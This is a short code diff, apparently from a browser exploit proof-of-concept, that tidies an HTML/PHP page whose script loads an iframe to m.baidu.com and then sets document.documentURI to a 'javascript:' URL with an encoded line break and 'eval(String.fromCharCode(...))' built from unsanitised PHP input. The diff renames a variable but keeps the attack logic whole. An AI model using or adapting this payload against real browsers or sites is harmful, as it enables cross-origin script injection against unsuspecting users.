@@ -19,13 +19,11 @@
 
 <body>
     <script>
-        i = document.body.appendChild(document.createElement("iframe"));
-        i.src = "http://m.baidu.com";
-        i.onload = function()
-        {
+        loadIframe = document.body.appendChild(document.createElement("iframe"));
+        loadIframe.src = "http://m.baidu.com";
+        loadIframe.onload = function() {
             document.documentURI = "javascript://hostname.com/%0D%0Aeval(String.fromCharCode(<?php echo $input; ?>))";
-            i.contentWindow.location = "";
-
+            loadIframe.contentWindow.location = "";
         }
     </script>
 </body>
